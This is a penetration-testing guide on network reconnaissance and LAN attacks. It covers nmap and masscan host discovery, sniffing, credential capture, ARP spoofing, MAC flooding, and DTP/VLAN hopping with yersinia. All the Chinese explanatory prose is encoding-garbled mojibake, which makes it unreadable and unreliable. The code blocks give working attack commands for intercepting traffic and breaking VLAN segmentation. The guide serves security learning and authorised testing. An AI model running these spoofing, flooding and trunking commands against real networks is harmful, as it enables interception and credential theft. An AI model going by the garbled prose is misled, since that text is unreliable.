# ç½‘ç»œæ¸—é€æµ‹è¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**èµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œè¿™æ˜¯ä¸€å®¶ç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œè®¿é—®[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## ä»å¤–éƒ¨å‘ç°ä¸»æœº

è¿™å°†æ˜¯ä¸€ä¸ªå…³äºå¦‚ä½•æ‰¾åˆ°**ä»äº’è”ç½‘å“åº”çš„IP**çš„**ç®€çŸ­éƒ¨åˆ†**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æœ‰ä¸€äº›**IPèŒƒå›´**ï¼ˆç”šè‡³å¯èƒ½æœ‰å‡ ä¸ª**èŒƒå›´**ï¼‰ï¼Œæ‚¨åªéœ€æ‰¾åˆ°**å“ªäº›IPæ­£åœ¨å“åº”**ã€‚

### ICMP

è¿™æ˜¯å‘ç°ä¸»æœºæ˜¯å¦å¯åŠ¨çš„**æœ€ç®€å•**å’Œ**æœ€å¿«**çš„æ–¹æ³•ã€‚\
æ‚¨å¯ä»¥å°è¯•å‘é€ä¸€äº›**ICMP**æ•°æ®åŒ…å¹¶**æœŸæœ›å“åº”**ã€‚æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å‘é€ä¸€ä¸ª**å›æ˜¾è¯·æ±‚**å¹¶æœŸæœ›å“åº”ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç®€å•çš„`ping`æˆ–ä½¿ç”¨`fping`æ¥å¤„ç†**èŒƒå›´**ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**nmap**å‘é€å…¶ä»–ç±»å‹çš„ICMPæ•°æ®åŒ…ï¼ˆè¿™å°†é¿å…å¸¸è§çš„ICMPå›æ˜¾è¯·æ±‚-å“åº”è¿‡æ»¤å™¨ï¼‰ã€‚
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPç«¯å£å‘ç°

é€šå¸¸ä¼šå‘ç°å„ç§ç±»å‹çš„ICMPæ•°æ®åŒ…è¢«è¿‡æ»¤ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥åšçš„å°±æ˜¯**å°è¯•æŸ¥æ‰¾å¼€æ”¾çš„ç«¯å£**æ¥æ£€æŸ¥ä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚æ¯å°ä¸»æœºæœ‰**65535ä¸ªç«¯å£**ï¼Œå› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰ä¸€ä¸ªâ€œå¤§â€èŒƒå›´ï¼Œæ‚¨**æ— æ³•**æµ‹è¯•æ¯ä¸ªä¸»æœºçš„**æ¯ä¸ªç«¯å£**æ˜¯å¦å¼€æ”¾ï¼Œè¿™å°†èŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚\
å› æ­¤ï¼Œæ‚¨éœ€è¦ä¸€ä¸ª**å¿«é€Ÿç«¯å£æ‰«æå·¥å…·**ï¼ˆ[masscan](https://github.com/robertdavidgraham/masscan)ï¼‰å’Œä¸€ä¸ª**å¸¸ç”¨ç«¯å£åˆ—è¡¨**ï¼š
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTPç«¯å£å‘ç°

è¿™åªæ˜¯ä¸€ä¸ªTCPç«¯å£å‘ç°ï¼Œå½“æ‚¨æƒ³è¦**ä¸“æ³¨äºå‘ç°HTTPæœåŠ¡**æ—¶éå¸¸æœ‰ç”¨ï¼š
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPç«¯å£å‘ç°

æ‚¨è¿˜å¯ä»¥å°è¯•æ£€æŸ¥ä¸€äº›**UDPç«¯å£æ˜¯å¦å¼€æ”¾**ï¼Œä»¥å†³å®šæ˜¯å¦åº”è¯¥å¯¹ä¸€ä¸ª**ä¸»æœº**ç»™äºˆ**æ›´å¤šå…³æ³¨**ã€‚ç”±äºUDPæœåŠ¡é€šå¸¸ä¸ä¼šå¯¹å¸¸è§„ç©ºçš„UDPæ¢æµ‹æ•°æ®åŒ…åšå‡ºä»»ä½•å“åº”ï¼Œå› æ­¤å¾ˆéš¾åˆ¤æ–­ç«¯å£æ˜¯è¢«è¿‡æ»¤è¿˜æ˜¯å¼€æ”¾çš„ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯å‘é€ä¸è¿è¡ŒæœåŠ¡ç›¸å…³çš„æ•°æ®åŒ…ï¼Œä½†ç”±äºæ‚¨ä¸çŸ¥é“è¿è¡Œçš„æ˜¯å“ªç§æœåŠ¡ï¼Œå› æ­¤åº”è¯¥æ ¹æ®ç«¯å£å·å°è¯•æœ€æœ‰å¯èƒ½çš„æœåŠ¡ï¼š
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
åœ¨æ­¤ä¹‹å‰æå‡ºçš„nmapå‘½ä»¤å°†æµ‹è¯•**/24**èŒƒå›´å†…æ¯ä¸ªä¸»æœºçš„**å‰1000ä¸ªUDPç«¯å£**ï¼Œä½†å³ä½¿å¦‚æ­¤ï¼Œè¿™å°†èŠ±è´¹**>20åˆ†é’Ÿ**ã€‚å¦‚æœéœ€è¦**æ›´å¿«çš„ç»“æœ**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)ï¼š`./udp-proto-scanner.pl 199.66.11.53/24`ã€‚è¿™å°†å‘å®ƒä»¬çš„**é¢„æœŸç«¯å£**å‘é€è¿™äº›**UDPæ¢é’ˆ**ï¼ˆå¯¹äº/24èŒƒå›´ï¼Œè¿™åªéœ€1åˆ†é’Ÿï¼‰ï¼š_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTPç«¯å£å‘ç°
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## ç½‘ç»œæ¸—é€æµ‹è¯•Wifi

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä»½å…³äºæ‰€æœ‰ä¼—æ‰€å‘¨çŸ¥çš„Wifiæ”»å‡»çš„è¯¦ç»†æŒ‡å—ï¼š

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## ä»å†…éƒ¨å‘ç°ä¸»æœº

å¦‚æœæ‚¨åœ¨ç½‘ç»œå†…éƒ¨ï¼Œæ‚¨å¯èƒ½é¦–å…ˆæƒ³è¦åšçš„äº‹æƒ…ä¹‹ä¸€å°±æ˜¯**å‘ç°å…¶ä»–ä¸»æœº**ã€‚æ ¹æ®æ‚¨å¯ä»¥/æƒ³è¦åˆ¶é€ çš„**å™ªéŸ³é‡**çš„å¤šå°‘ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼š

### è¢«åŠ¨

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·è¢«åŠ¨åœ°å‘ç°è¿æ¥ç½‘ç»œå†…éƒ¨çš„ä¸»æœºï¼š
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### ä¸»åŠ¨

è¯·æ³¨æ„ï¼Œ[_**ä»å¤–éƒ¨å‘ç°ä¸»æœº**_](./#discovering-hosts-from-the-outside)ï¼ˆ_TCP/HTTP/UDP/SCTPç«¯å£å‘ç°_ï¼‰ä¸­è¯„è®ºçš„æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œ**åº”ç”¨**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šçš„äº‹æƒ…**ï¼š
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ä¸»åŠ¨ ICMP

è¯·æ³¨æ„ï¼Œ_ä»å¤–éƒ¨å‘ç°ä¸»æœº_ï¼ˆ[_**ICMP**_](./#icmp)ï¼‰ä¸­è¯„è®ºçš„æŠ€æœ¯ä¹Ÿå¯ä»¥**åº”ç”¨äºè¿™é‡Œ**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šçš„äº‹æƒ…**ï¼š

- å¦‚æœæ‚¨**ping**ä¸€ä¸ª**å­ç½‘å¹¿æ’­åœ°å€**ï¼Œåˆ™pingåº”è¯¥åˆ°è¾¾**æ¯ä¸ªä¸»æœº**ï¼Œå®ƒä»¬å¯ä»¥**å“åº”**ç»™**æ‚¨**ï¼š`ping -b 10.10.5.255`
- å¯¹**ç½‘ç»œå¹¿æ’­åœ°å€**è¿›è¡Œpingï¼Œç”šè‡³å¯ä»¥æ‰¾åˆ°**å…¶ä»–å­ç½‘å†…çš„ä¸»æœº**ï¼š`ping -b 255.255.255.255`
- ä½¿ç”¨`nmap`çš„`-PE`ã€`-PP`ã€`-PM`æ ‡å¿—æ‰§è¡Œä¸»æœºå‘ç°ï¼Œåˆ†åˆ«å‘é€**ICMPv4 echo**ã€**æ—¶é—´æˆ³**å’Œ**å­ç½‘æ©ç è¯·æ±‚**ï¼š`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **å”¤é†’å±€åŸŸç½‘**

å”¤é†’å±€åŸŸç½‘ç”¨äºé€šè¿‡**ç½‘ç»œæ¶ˆæ¯****æ‰“å¼€**è®¡ç®—æœºã€‚ç”¨äºæ‰“å¼€è®¡ç®—æœºçš„é­”æœ¯æ•°æ®åŒ…åªæ˜¯ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå…¶ä¸­æä¾›äº†ä¸€ä¸ª**MAC Dst**ï¼Œç„¶ååœ¨åŒä¸€ä¸ªæ•°æ®åŒ…ä¸­**é‡å¤16æ¬¡**ã€‚\
ç„¶åï¼Œè¿™ç§ç±»å‹çš„æ•°æ®åŒ…é€šå¸¸å‘é€åˆ°**ä»¥å¤ªç½‘ 0x0842**æˆ–**UDPæ•°æ®åŒ…åˆ°ç«¯å£9**ã€‚\
å¦‚æœæœªæä¾›**\[MAC]**ï¼Œåˆ™æ•°æ®åŒ…å°†å‘é€åˆ°**å¹¿æ’­ä»¥å¤ªç½‘**ï¼ˆå¹¿æ’­MACå°†è¢«é‡å¤ï¼‰ã€‚
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## æ‰«æä¸»æœº

ä¸€æ—¦æ‚¨å‘ç°äº†æ‰€æœ‰è¦æ·±å…¥æ‰«æçš„IPï¼ˆå¤–éƒ¨æˆ–å†…éƒ¨ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚

### TCP

* **å¼€æ”¾**ç«¯å£ï¼š_SYN --> SYN/ACK --> RST_
* **å…³é—­**ç«¯å£ï¼š_SYN --> RST/ACK_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> \[æ— å“åº”]_
* **è¿‡æ»¤**ç«¯å£ï¼š_SYN --> ICMPæ¶ˆæ¯_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

æœ‰ä¸¤ç§é€‰é¡¹æ¥æ‰«æ UDP ç«¯å£ï¼š

- å‘é€ä¸€ä¸ª **UDP æ•°æ®åŒ…** å¹¶æ£€æŸ¥å“åº”æ˜¯å¦ä¸º _**ICMP ä¸å¯è¾¾**_ï¼Œå¦‚æœç«¯å£æ˜¯ **å…³é—­** çš„ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒICMP å°†è¢« **è¿‡æ»¤**ï¼Œå› æ­¤æ‚¨å°†æ— æ³•æ”¶åˆ°æœ‰å…³ç«¯å£æ˜¯å…³é—­è¿˜æ˜¯æ‰“å¼€çš„ä¿¡æ¯ï¼‰ã€‚
- å‘é€ä¸€ä¸ª **æ ¼å¼åŒ–æ•°æ®æŠ¥** æ¥å¼•å‘ä¸€ä¸ªæ¥è‡ª **æœåŠ¡** çš„å“åº”ï¼ˆä¾‹å¦‚ï¼ŒDNSã€DHCPã€TFTP ç­‰ï¼Œåœ¨ _nmap-payloads_ ä¸­åˆ—å‡ºï¼‰ã€‚å¦‚æœæ‚¨æ”¶åˆ°ä¸€ä¸ª **å“åº”**ï¼Œé‚£ä¹ˆç«¯å£æ˜¯ **æ‰“å¼€** çš„ã€‚

**Nmap** å°†ä½¿ç”¨ "-sV" **æ··åˆ** è¿™ä¸¤ä¸ªé€‰é¡¹ï¼ˆUDP æ‰«æéå¸¸æ…¢ï¼‰ï¼Œä½†è¯·æ³¨æ„ UDP æ‰«ææ¯” TCP æ‰«ææ…¢ï¼š
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPæ‰«æ

SCTPä¸TCPå’ŒUDPå¹¶åˆ—ã€‚æ—¨åœ¨é€šè¿‡IPæä¾›**ç”µè¯**æ•°æ®çš„**ä¼ è¾“**ï¼Œè¯¥åè®®å¤åˆ¶äº†ä¿¡ä»¤ç³»ç»Ÿ7ï¼ˆSS7ï¼‰çš„è®¸å¤šå¯é æ€§åŠŸèƒ½ï¼Œå¹¶æ”¯æŒä¸€ä¸ªç§°ä¸ºSIGTRANçš„æ›´å¤§åè®®ç³»åˆ—ã€‚SCTPå—åˆ°åŒ…æ‹¬IBM AIXã€Oracle Solarisã€HP-UXã€Linuxã€Cisco IOSå’ŒVxWorksåœ¨å†…çš„æ“ä½œç³»ç»Ÿçš„æ”¯æŒã€‚

nmapæä¾›äº†ä¸¤ç§ä¸åŒçš„SCTPæ‰«æï¼š_-sY_å’Œ_-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSå’ŒIPSè§„é¿

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **æ›´å¤šnmapé€‰é¡¹**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### æ­ç¤ºå†…éƒ¨IPåœ°å€

é…ç½®é”™è¯¯çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å’Œç½‘ç»œè®¾å¤‡æœ‰æ—¶ä¼šä½¿ç”¨éå…¬å…±æºåœ°å€å“åº”ç½‘ç»œæ¢æµ‹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨tcpdumpæ¥è¯†åˆ«åœ¨æµ‹è¯•æœŸé—´ä»ç§æœ‰åœ°å€æ¥æ”¶çš„æ•°æ®åŒ…ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒKali Linuxä¸­çš„eth2æ¥å£å¯ä»¥ä»å…¬å…±äº’è”ç½‘è®¿é—®ï¼ˆå¦‚æœæ‚¨åœ¨NATæˆ–é˜²ç«å¢™åé¢ï¼Œè¿™ç§æ•°æ®åŒ…å¯èƒ½ä¼šè¢«è¿‡æ»¤ï¼‰ã€‚
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

é€šè¿‡æŸ¥çœ‹æ•è·çš„å¸§å’Œæ•°æ®åŒ…ï¼Œæ‚¨å¯ä»¥äº†è§£IPèŒƒå›´ã€å­ç½‘å¤§å°ã€MACåœ°å€å’Œä¸»æœºåçš„è¯¦ç»†ä¿¡æ¯ã€‚å¦‚æœç½‘ç»œé…ç½®ä¸æ­£ç¡®æˆ–äº¤æ¢æœºç»“æ„å‹åŠ›è¿‡å¤§ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¢«åŠ¨ç½‘ç»œå—…æ¢æ•è·æ•æ„Ÿææ–™ã€‚

å¦‚æœäº¤æ¢å¼ä»¥å¤ªç½‘ç½‘ç»œé…ç½®æ­£ç¡®ï¼Œæ‚¨åªä¼šçœ‹åˆ°å¹¿æ’­å¸§å’Œå‘é€åˆ°æ‚¨çš„MACåœ°å€çš„ææ–™ã€‚

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
ä¸€ä¸ªäººä¹Ÿå¯ä»¥é€šè¿‡Wiresharkä½œä¸ºGUIå®æ—¶åœ¨SSHä¼šè¯ä¸­ä»è¿œç¨‹è®¡ç®—æœºæ•è·æ•°æ®åŒ…ã€‚
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

æ˜¾è€Œæ˜“è§ã€‚

### æ•è·å‡­è¯

æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)çš„å·¥å…·æ¥ä»pcapæ–‡ä»¶æˆ–å®æ—¶æ¥å£ä¸­è§£æå‡­è¯ã€‚

## å±€åŸŸç½‘æ”»å‡»

### ARPæ¬ºéª—

ARPæ¬ºéª—æ˜¯æŒ‡å‘é€ä¼ªé€ çš„ARPå“åº”ï¼ŒæŒ‡ç¤ºæŸå°æœºå™¨çš„IPå…·æœ‰æˆ‘ä»¬è®¾å¤‡çš„MACåœ°å€ã€‚ç„¶åï¼Œå—å®³è€…å°†æ›´æ”¹ARPè¡¨ï¼Œå¹¶åœ¨æ¯æ¬¡æƒ³è¦è”ç³»ä¼ªé€ IPæ—¶ä¸æˆ‘ä»¬çš„æœºå™¨è”ç³»ã€‚

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoofæ˜¯ä¸€ä¸ªç®€å•çš„å·¥å…·ï¼Œç”¨äºæ¬ºéª—å±€åŸŸç½‘ä¸Šçš„ä¸»æœºï¼Œä½¿å…¶ç›¸ä¿¡æ”»å‡»è€…çš„æœºå™¨æ˜¯ç½‘ç»œä¸­çš„ç½‘å…³ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºä¸­é—´äººæ”»å‡»ï¼Œä»¥ä¾¿ç›‘è§†æˆ–ç¯¡æ”¹å—å®³è€…å’Œç½‘å…³ä¹‹é—´çš„é€šä¿¡ã€‚
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Floodæ”»å‡» - CAMè¡¨æº¢å‡º

é€šè¿‡å‘é€å¤§é‡å…·æœ‰ä¸åŒæºMACåœ°å€çš„æ•°æ®åŒ…æ¥æº¢å‡ºäº¤æ¢æœºçš„CAMè¡¨ã€‚å½“CAMè¡¨å·²æ»¡æ—¶ï¼Œäº¤æ¢æœºä¼šå¼€å§‹è¡¨ç°å¾—åƒé›†çº¿å™¨ä¸€æ ·ï¼ˆå¹¿æ’­æ‰€æœ‰æµé‡ï¼‰ã€‚
```bash
macof -i <interface>
```
### 802.1Q VLAN / DTP Attacks

#### åŠ¨æ€å¹²çº¿

**DTPï¼ˆåŠ¨æ€å¹²çº¿åè®®ï¼‰**æ˜¯ä¸€ç§é“¾è·¯å±‚åè®®ï¼Œæ—¨åœ¨æä¾›è‡ªåŠ¨å¹²çº¿ç³»ç»Ÿã€‚é€šè¿‡DTPï¼Œäº¤æ¢æœºå†³å®šå“ªä¸ªç«¯å£å°†ä»¥å¹²çº¿æ¨¡å¼ï¼ˆTrunkï¼‰å·¥ä½œï¼Œå“ªä¸ªç«¯å£ä¸ä¼šã€‚**ä½¿ç”¨DTPè¡¨æ˜ç½‘ç»œè®¾è®¡ä¸ä½³ã€‚å¹²çº¿åº”è¯¥ä¸¥æ ¼**æ”¾åœ¨éœ€è¦çš„åœ°æ–¹ï¼Œå¹¶ä¸”åº”è¯¥æœ‰æ–‡æ¡£è®°å½•ã€‚

**é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰äº¤æ¢æœºç«¯å£éƒ½åœ¨åŠ¨æ€è‡ªåŠ¨æ¨¡å¼ä¸‹è¿è¡Œã€‚**è¿™è¡¨ç¤ºäº¤æ¢æœºç«¯å£å¤„äºä»ç›¸é‚»äº¤æ¢æœºå¯åŠ¨å¹²çº¿çš„æ¨¡å¼ã€‚**æ¸—é€æµ‹è¯•äººå‘˜éœ€è¦ç‰©ç†è¿æ¥åˆ°äº¤æ¢æœºå¹¶å‘é€ä¸€ä¸ªDTP Desirableå¸§**ï¼Œè¿™å°†è§¦å‘ç«¯å£åˆ‡æ¢åˆ°å¹²çº¿æ¨¡å¼ã€‚æ”»å‡»è€…éšåå¯ä»¥é€šè¿‡åˆ›å»ºè™šæ‹Ÿæ¥å£ï¼Œä½¿ç”¨STPå¸§åˆ†ææšä¸¾VLANå¹¶ç»•è¿‡VLANåˆ†å‰²ã€‚

è®¸å¤šäº¤æ¢æœºé»˜è®¤æ”¯æŒåŠ¨æ€å¹²çº¿åè®®ï¼ˆDTPï¼‰ï¼Œç„¶è€Œï¼Œå¯¹æ‰‹å¯ä»¥æ»¥ç”¨å®ƒæ¥**æ¨¡æ‹Ÿäº¤æ¢æœºå¹¶æ¥æ”¶æ‰€æœ‰VLANçš„æµé‡**ã€‚å·¥å…·[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)å¯ä»¥å—…æ¢ä¸€ä¸ªæ¥å£ï¼Œå¹¶**æŠ¥å‘Šäº¤æ¢æœºæ˜¯å¦å¤„äºé»˜è®¤æ¨¡å¼ã€å¹²çº¿ã€åŠ¨æ€ã€è‡ªåŠ¨æˆ–è®¿é—®æ¨¡å¼**ï¼ˆè¿™æ˜¯å”¯ä¸€å¯ä»¥é¿å…VLANè·³è·ƒçš„æ¨¡å¼ï¼‰ã€‚è¯¥å·¥å…·å°†æŒ‡ç¤ºäº¤æ¢æœºæ˜¯å¦å­˜åœ¨æ¼æ´ã€‚

å¦‚æœå‘ç°ç½‘ç»œå­˜åœ¨æ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨_**Yersinia**_å¯åŠ¨ä¸€ä¸ªä½¿ç”¨åè®®â€œ**DTP**â€çš„â€œ**å¯ç”¨å¹²çº¿**â€ï¼Œä»è€Œèƒ½å¤ŸæŸ¥çœ‹æ¥è‡ªæ‰€æœ‰VLANçš„ç½‘ç»œæ•°æ®åŒ…ã€‚
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

è¦æšä¸¾VLANï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬[**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**ç”ŸæˆDTP Desirableå¸§ã€‚**åˆ‡å‹¿åœ¨ä»»ä½•æƒ…å†µä¸‹ä¸­æ–­è„šæœ¬ã€‚å®ƒæ¯ä¸‰ç§’æ³¨å…¥ä¸€ä¸ªDTP Desirableã€‚**äº¤æ¢æœºä¸ŠåŠ¨æ€åˆ›å»ºçš„å¹²é“é€šé“åªèƒ½å­˜æ´»äº”åˆ†é’Ÿã€‚äº”åˆ†é’Ÿåï¼Œå¹²é“ä¼šæ‰è½ã€‚**
```
sudo python3 DTPHijacking.py --interface eth0
```
æˆ‘æƒ³æŒ‡å‡º**Access/Desirable (0x03)**è¡¨ç¤ºDTPå¸§æ˜¯Desirableç±»å‹ï¼Œå‘Šè¯‰ç«¯å£åˆ‡æ¢åˆ°Trunkæ¨¡å¼ã€‚è€Œ**802.1Q/802.1Q (0xa5)**è¡¨ç¤º**802.1Q**å°è£…ç±»å‹ã€‚

é€šè¿‡åˆ†æSTPå¸§ï¼Œ**æˆ‘ä»¬äº†è§£åˆ°VLAN 30å’ŒVLAN 60çš„å­˜åœ¨ã€‚**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### æ”»å‡»ç‰¹å®šVLAN

